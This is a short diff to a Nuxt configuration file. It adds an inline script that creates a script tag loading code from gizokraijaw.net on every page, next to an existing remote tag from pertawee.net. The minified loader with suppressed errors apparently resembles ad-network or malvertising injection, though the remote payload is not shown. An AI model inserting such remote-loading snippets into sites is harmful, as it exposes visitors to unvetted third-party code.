@@ -45,6 +45,9 @@ export default defineNuxtConfig({
           src: 'https://pertawee.net/act/files/tag.min.js?z=9738661',
           'data-cfasync': 'false',
           async: true
+        },
+        {
+          innerHTML: "(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9739035,document.createElement('script'))"
         }
       ]
     }
